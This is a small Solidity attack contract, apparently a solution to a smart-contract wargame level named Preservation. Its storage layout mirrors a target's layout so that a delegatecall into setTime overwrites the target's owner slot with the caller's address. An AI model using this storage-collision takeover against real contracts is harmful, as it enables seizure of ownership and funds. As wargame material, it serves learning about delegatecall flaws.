// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackPreservation{

    address public Addr1;      // Slot 0    
    address public Addr2;      // Slot 1    
    address public theOwner;   // Slot 2    
    uint storedTime;           // Slot 3 

    function setTime(uint _time) public {
        theOwner = msg.sender;
    }
}
